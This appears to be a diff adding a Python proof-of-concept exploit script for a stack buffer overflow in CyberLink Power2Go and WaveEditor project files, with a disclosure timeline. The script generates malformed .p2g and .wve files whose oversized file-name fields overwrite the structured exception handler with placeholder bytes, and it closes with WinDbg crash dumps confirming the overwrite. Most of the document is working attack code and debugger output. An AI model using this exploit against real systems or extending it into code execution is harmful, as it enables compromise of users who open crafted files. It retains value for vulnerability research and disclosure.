@@ -1,0 +1,281 @@
+#!/usr/bin/python
+# 
+# Exploit Title: CyberLink Multiple Products File Project Handling Stack Buffer Overflow POC
+# by: modpr0be[at]spentera[dot]com (@modpr0be)
+# Platform: Windows
+# Tested on: Windows XP SP3, Windows 7 SP1 with:
+# 	CyberLink Power2Go 7 (build 196)
+# 	CyberLink Power2Go 8 (build 1031)
+# 	CyberLink WaveEditor 2.0 (build 2204)
+# Software Link: http://www.cyberlink.com/downloads/trials/index_en_US.html
+# CVE : -
+
+### Software Description
+# CyberLink Power2Go is all-media disc burning software. 
+# Copy all your media to any disc with Power2Go 8! With new System Recovery tools 
+# and over 5000 free DVD menus to choose from on DirectorZone.com, Power2Go 8 not 
+# only burns everything but allows you to create pro-like DVDs, rip CDs and 
+# safeguard valuable data. 
+
+# CyberLink Wave Editor will help user to convert audio format when producing, editing, 
+# or creating backups for some audios or videos. This additional tools is also included 
+# since PowerDirector 9 to PowerDirector 10, and now included on Power2Go 8.
+
+### Vulnerability Details
+# Most of CyberLink products contain built-in project file with their own format and
+# extension. This file usually contains our recently modified project or work.
+# Most of this filetypes contain this section:
+#     <File src=
+#     <File name=
+# Generally, those sections will be filled with source path or filename. 
+# both products will lead us to command execution because the address of 
+# SE Handler is overwritten with 0x00410041.
+
+# Notes:
+# I cannot find any good return address for WaveEditor, if you can make it
+# through the hard way, kudos!!
+
+### Vendor logs:
+# 10/10/2011 - Bug found
+# 10/11/2011 - Vendor contacted
+# 10/11/2011 - Vendor replied and requested POC
+# 10/11/2011 - POC sent to vendor
+# 10/31/2011 - Vendor said the POC will be researched
+# 10/27/2011 - Submitted to CERT
+# 11/09/2011 - CyberLink updated the product
+# 11/09/2011 - POC still works on the latest version
+# 12/09/2011 - No response from vendor, POC release.
+
+import time,sys
+
+def power2go():
+	# header for power2go
+	header = (
+	"\x3c\x50\x72\x6f\x6a\x65\x63\x74\x20\x6d\x61\x67\x69\x63"
+	"\x3d\x22\x69\x6e\x73\x65\x63\x75\x72\x69\x74\x79\x22\x20"
+	"\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x30\x31\x22\x3e"
+	"\x0d\x0a\x3c\x49\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e"
+	"\x2f\x3e\x0d\x0a\x3c\x43\x6f\x6d\x70\x69\x6c\x61\x74\x69"
+	"\x6f\x6e\x3e\x0d\x0a\x3c\x44\x61\x74\x61\x44\x69\x73\x63"
+	"\x20\x0d\x0a\x64\x69\x73\x63\x4e\x61\x6d\x65\x3d\x22\x49"
+	"\x4e\x53\x45\x43\x55\x52\x49\x54\x59\x22\x20\x0d\x0a\x66"
+	"\x69\x6c\x65\x44\x61\x74\x65\x3d\x22\x6f\x72\x69\x67\x69"
+	"\x6e\x61\x6c\x22\x20\x66\x69\x6c\x65\x54\x69\x6d\x65\x3d"
+	"\x22\x30\x22\x20\x0d\x0a\x64\x69\x73\x63\x54\x79\x70\x65"
+	"\x3d\x22\x63\x64\x22\x20\x0d\x0a\x73\x65\x73\x73\x69\x6f"
+	"\x6e\x53\x69\x7a\x65\x3d\x22\x30\x22\x20\x0d\x0a\x50\x4f"
+	"\x57\x42\x75\x72\x6e\x65\x64\x53\x69\x7a\x65\x3d\x22\x30"
+	"\x22\x20\x0d\x0a\x53\x65\x63\x75\x72\x65\x64\x44\x61\x74"
+	"\x61\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x57\x68"
+	"\x6f\x6c\x65\x53\x65\x63\x75\x72\x65\x64\x44\x61\x74\x61"
+	"\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x53\x65\x63"
+	"\x75\x72\x69\x74\x79\x4b\x65\x79\x53\x69\x7a\x65\x3d\x22"
+	"\x31\x36\x22\x20\x0d\x0a\x48\x69\x64\x65\x46\x69\x6c\x65"
+	"\x4e\x61\x6d\x65\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d"
+	"\x0a\x62\x6f\x6f\x74\x61\x62\x6c\x65\x3d\x22\x66\x61\x6c"
+	"\x73\x65\x22\x20\x0d\x0a\x62\x6f\x6f\x74\x46\x6c\x6f\x70"
+	"\x70\x79\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x62"
+	"\x6f\x6f\x74\x49\x6d\x61\x67\x65\x3d\x22\x22\x20\x0d\x0a"
+	"\x61\x75\x74\x6f\x52\x75\x6e\x45\x78\x65\x3d\x22\x66\x61"
+	"\x6c\x73\x65\x22\x20\x0d\x0a\x61\x75\x74\x6f\x52\x75\x6e"
+	"\x45\x78\x65\x50\x61\x74\x68\x3d\x22\x22\x20\x0d\x0a\x61"
+	"\x75\x74\x6f\x52\x75\x6e\x49\x63\x6f\x6e\x3d\x22\x66\x61"
+	"\x6c\x73\x65\x22\x20\x0d\x0a\x61\x75\x74\x6f\x52\x75\x6e"
+	"\x49\x63\x6f\x6e\x50\x61\x74\x68\x3d\x22\x22\x20\x0d\x0a"
+	"\x41\x75\x74\x6f\x53\x70\x6c\x69\x74\x44\x69\x73\x63\x3d"
+	"\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x44\x69\x73\x63"
+	"\x53\x70\x6c\x69\x74\x3d\x22\x66\x61\x6c\x73\x65\x22\x20"
+	"\x0d\x0a\x41\x75\x74\x6f\x4f\x76\x65\x72\x42\x75\x72\x6e"
+	"\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x44\x61\x74"
+	"\x61\x50\x72\x6a\x74\x6f\x56\x69\x64\x65\x6f\x50\x72\x6a"
+	"\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x73\x69\x6d"
+	"\x75\x6c\x61\x74\x69\x6f\x6e\x3d\x22\x66\x61\x6c\x73\x65"
+	"\x22\x20\x0d\x0a\x62\x75\x72\x6e\x50\x72\x6f\x6f\x66\x3d"
+	"\x22\x74\x72\x75\x65\x22\x20\x0d\x0a\x63\x6c\x6f\x73\x65"
+	"\x44\x69\x73\x63\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d"
+	"\x0a\x76\x65\x72\x69\x66\x79\x44\x69\x73\x63\x3d\x22\x66"
+	"\x61\x6c\x73\x65\x22\x20\x0d\x0a\x64\x65\x66\x65\x63\x74"
+	"\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x3d\x22\x66\x61"
+	"\x6c\x73\x65\x22\x20\x0d\x0a\x63\x6f\x70\x69\x65\x73\x3d"
+	"\x22\x31\x22\x20\x0d\x0a\x62\x75\x72\x6e\x53\x70\x65\x65"
+	"\x64\x3d\x22\x30\x22\x20\x0d\x0a\x63\x64\x54\x65\x78\x74"
+	"\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x41\x75\x64"
+	"\x69\x6f\x4e\x6f\x72\x6d\x61\x6c\x69\x7a\x65\x3d\x22\x66"
+	"\x61\x6c\x73\x65\x22\x20\x0d\x0a\x41\x75\x64\x69\x6f\x47"
+	"\x61\x70\x54\x69\x6d\x65\x3d\x22\x32\x22\x20\x0d\x0a\x46"
+	"\x69\x6c\x65\x53\x79\x73\x74\x65\x6d\x3d\x22\x49\x53\x4f"
+	"\x39\x36\x36\x30\x5f\x4a\x4f\x4c\x49\x45\x54\x22\x3e")
+
+	body = (
+	"\x73\x72\x63\x3d\x22\x43\x3a\x5c\x61\x62\x63\x2e\x74\x78"
+	"\x74\x22\x20\x0d\x0a\x6f\x70\x65\x72\x61\x74\x69\x6f\x6e"
+	"\x3d\x22\x61\x64\x64\x22\x20\x0d\x0a\x62\x75\x72\x6e\x73"
+	"\x74\x61\x74\x75\x73\x3d\x22\x6e\x6f\x74\x62\x75\x72\x6e"
+	"\x22\x20\x0d\x0a\x73\x69\x7a\x65\x3d\x22\x32\x39\x32\x38"
+	"\x36\x34\x22\x20\x0d\x0a\x53\x68\x6f\x77\x53\x69\x7a\x65"
+	"\x3d\x22\x32\x39\x32\x38\x36\x34\x22\x20\x0d\x0a\x41\x6c"
+	"\x6c\x6f\x77\x45\x6e\x63\x72\x79\x70\x74\x3d\x22\x66\x61"
+	"\x6c\x73\x65\x22\x20\x0d\x0a\x53\x65\x63\x75\x72\x65\x64"
+	"\x52\x6f\x6f\x74\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d"
+	"\x0a\x66\x69\x6c\x65\x54\x69\x6d\x65\x3d\x22\x31\x32\x39"
+	"\x33\x36\x37\x33\x34\x31\x35\x30\x39\x37\x33\x36\x38\x37"
+	"\x34\x22\x20\x0d\x0a\x6f\x6c\x64\x3d\x22\x66\x61\x6c\x73"
+	"\x65\x22\x20\x0d\x0a\x74\x65\x6d\x70\x66\x69\x6c\x65\x3d"
+	"\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x74\x65\x6d\x70"
+	"\x64\x69\x72\x6c\x65\x76\x65\x6c\x3d\x22\x30\x22\x20\x0d"
+	"\x0a\x66\x6f\x72\x61\x75\x64\x69\x6f\x74\x72\x61\x63\x6b"
+	"\x3d\x22\x66\x61\x6c\x73\x65\x22\x20\x0d\x0a\x74\x61\x72"
+	"\x67\x65\x74\x41\x75\x64\x69\x6f\x43\x44\x3d\x22\x66\x61"
+	"\x6c\x73\x65\x22\x20\x0d\x0a\x64\x61\x74\x61\x69\x74\x65"
+	"\x6d\x74\x79\x70\x65\x3d\x22\x30\x22\x20\x0d\x0a\x6d\x76"
+	"\x70\x3d\x22\x30\x22\x20\x0d\x0a\x61\x75\x64\x69\x6f\x53"
+	"\x75\x62\x74\x79\x70\x65\x3d\x22\x30\x22\x2f\x3e\x0d\x0a"
+	"\x3c\x2f\x44\x61\x74\x61\x44\x69\x73\x63\x3e\x0d\x0a\x3c"
+	"\x2f\x43\x6f\x6d\x70\x69\x6c\x61\x74\x69\x6f\x6e\x3e\x0d"
+	"\x0a\x3c\x2f\x50\x72\x6f\x6a\x65\x63\x74\x3e")
+
+	pgfile = "overflow.p2g"
+	f = open(pgfile,'w')
+	junk = "A" * 778
+	nseh = "\x42\x42"
+	seh = "\x43\x43"
+	sisa =  "\x44" * 4200
+
+	hell = "\x3c\x46\x69\x6c\x65" + "\r\n"	# <File
+	hell+= "name=" + '"'+ junk+nseh+seh+sisa + '"'
+	try:
+		f.write(header+ "\r\n" + hell + "\r\n" + body)
+		print "[!] Generating", pgfile, ".."
+		time.sleep(1)
+		print "[+] File", pgfile, "successfully created!"
+		print "[*] Now open project file" +" \'"+pgfile+"\' " + "with CyberLink Power2Go."
+		print "[*] Good luck ;)"
+		f.close()
+	except IOError:
+		print "[-] Could not write to destination folder, check permission.."
+		sys.exit()
+
+def waveeditor():
+	header = ("\x3c\x50\x72\x6f\x6a\x65\x63\x74\x20\x41\x70\x70\x6c\x69\x63\x61"
+	"\x74\x69\x6f\x6e\x3d\x22\x57\x61\x76\x65\x45\x64\x69\x74\x6f\x72\x22\x20"
+	"\x56\x65\x72\x73\x69\x6f\x6e\x3d\x22\x32\x2e\x30\x22\x3e")
+
+	wvefile = "overflow.wve"
+	f = open(wvefile,'w')
+	junk = "A" * 3000
+
+	hell = "\x3c\x46\x69\x6c\x65\x20\x53\x72\x63\x3d" # <File src=
+	hell += '"'+ junk + '"' + "\x3e"
+
+	fill = ("\x3c\x42\x6f\x6f\x6b\x6d\x61\x72\x6b\x4c\x69\x73\x74\x2f\x3e\x3c"
+	"\x2f\x46\x69\x6c\x65\x3e\x3c\x2f\x50\x72\x6f\x6a\x65\x63\x74\x3e")
+	
+	fill = ("\x3c\x42\x6f\x6f\x6b\x6d\x61\x72\x6b\x4c\x69\x73\x74\x2f\x3e\x3c"
+	"\x2f\x46\x69\x6c\x65\x3e\x3c\x43\x6f\x6d\x70\x69\x6c\x61\x74\x69\x6f\x6e"
+	"\x3e\x3c\x41\x75\x64\x69\x6f\x43\x44\x20\x62\x75\x72\x6e\x50\x72\x6f\x6f"
+	"\x66\x3d\x22\x74\x72\x75\x65\x22\x20\x63\x6f\x70\x69\x65\x73\x3d\x22\x30"
+	"\x22\x20\x62\x75\x72\x6e\x53\x70\x65\x65\x64\x3d\x22\x30\x22\x20\x41\x75"
+	"\x64\x69\x6f\x4e\x6f\x72\x6d\x61\x6c\x69\x7a\x65\x3d\x22\x66\x61\x6c\x73"
+	"\x65\x22\x20\x41\x75\x64\x69\x6f\x47\x61\x70\x54\x69\x6d\x65\x3d\x22\x32"
+	"\x22\x2f\x3e\x3c\x2f\x43\x6f\x6d\x70\x69\x6c\x61\x74\x69\x6f\x6e\x3e\x3c"
+	"\x2f\x50\x72\x6f\x6a\x65\x63\x74\x3e")
+	
+	try:
+		f.write(header+hell+fill)
+		print "[!] Generating", wvefile, ".."
+		time.sleep(1)
+		print "[+] File", wvefile, "successfully created!"
+		print "[*] Now open project file" +" \'"+wvefile+"\' " + "with CyberLink WaveEditor."
+		print "[*] Good luck ;)"
+		f.close()
+	except IOError:
+		print "[-] Could not write to destination folder, check permission.."
+		sys.exit()
+
+print "[*] CyberLink Multiple Products File Project Processing Stack Buffer Overflow POC."
+print "[*] by modpr0be <modpr0be[at]spentera[dot]com> | @modpr0be"
+print "\t1.CyberLink Power2Go <= 8.0"
+print "\t2.CyberLink WaveEditor <= 2.0"
+
+a = 0
+while a < 2:
+	a = a + 1
+	op = input ("[!] Choose the product: ")
+	if op == 1:
+		power2go()
+		sys.exit()
+	elif op == 2:
+		waveeditor()
+		sys.exit()
+	else:
+		print "[-] Oh plz.. pick the right one :)\r\n"
+
+
+### DUMP OF POWER2GO
+#(d18.c60): Break instruction exception - code 80000003 (first chance)
+#eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
+#eip=7c90120e esp=07d4ffcc ebp=07d4fff4 iopl=0         nv up ei pl zr na pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
+#ntdll!DbgBreakPoint:
+#7c90120e cc              int     3
+#Missing image name, possible paged-out or corrupt data.
+#Missing image name, possible paged-out or corrupt data.
+#0:022> g
+#(d18.d40): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=ec8b55ff ebx=010358b0 ecx=78ad8951 edx=005b12fc esi=00430043 edi=0012d69c
+#eip=ec8b55ff esp=0012ca70 ebp=00000000 iopl=0         nv up ei pl zr na pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+#ec8b55ff ??              ???
+#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\CyberLink\Power2Go8\Power2Go8.exe - 
+#0:000> !exchain
+#0012ca9c: Power2Go8!CCLAuMixerAPI::operator=+156ba8 (00560dc8)
+#0012d104: Power2Go8!CCLAuMixerAPI::operator=+25e23 (00430043)
+#Invalid exception stack at 00420042
+#0:000> d 0012d104
+#0012d104  42 00 42 00 43 00 43 00-43 00 43 00 43 00 43 00  B.B.C.C.C.C.C.C.
+#0012d114  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+#0012d124  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+#0012d134  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+#0012d144  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+#0012d154  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+#0012d164  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+#0012d174  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.
+
+
+### DUMP OF WAVE EDITOR
+#(e44.734): Break instruction exception - code 80000003 (first chance)
+#eax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005
+#eip=7c90120e esp=00e5ffcc ebp=00e5fff4 iopl=0         nv up ei pl zr na pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
+#ntdll!DbgBreakPoint:
+#7c90120e cc              int     3
+#Missing image name, possible paged-out or corrupt data.
+#Missing image name, possible paged-out or corrupt data.
+#0:016> g
+#(e44.e48): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=00410041 ebx=ffffffff ecx=0240868b edx=420b1802 esi=022ccbe8 edi=00d2f848
+#eip=024c47af esp=0012c424 ebp=0012c42c iopl=0         nv up ei pl nz na pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
+#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\CyberLink\WaveEditor\WaveKernel.dll -
+#WaveKernel!ReleaseWaveKernelClient+0x12a8f:
+#024c47af 8b4208          mov     eax,dword ptr [edx+8] ds:0023:420b180a=????????
+#Missing image name, possible paged-out or corrupt data.
+#Missing image name, possible paged-out or corrupt data.
+#0:000> !exchain
+#0012c898: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\CyberLink\WaveEditor\WaveEditor.exe -
+#WaveEditor!CCLAuMixerAPI::CCLAuMixerAPI+da61 (00410041)
+#Invalid exception stack at 00410041
+#0:000> d 0012c898
+#0012c898  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c8a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c8b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c8c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c8d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c8e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c8f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#0012c908  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+#
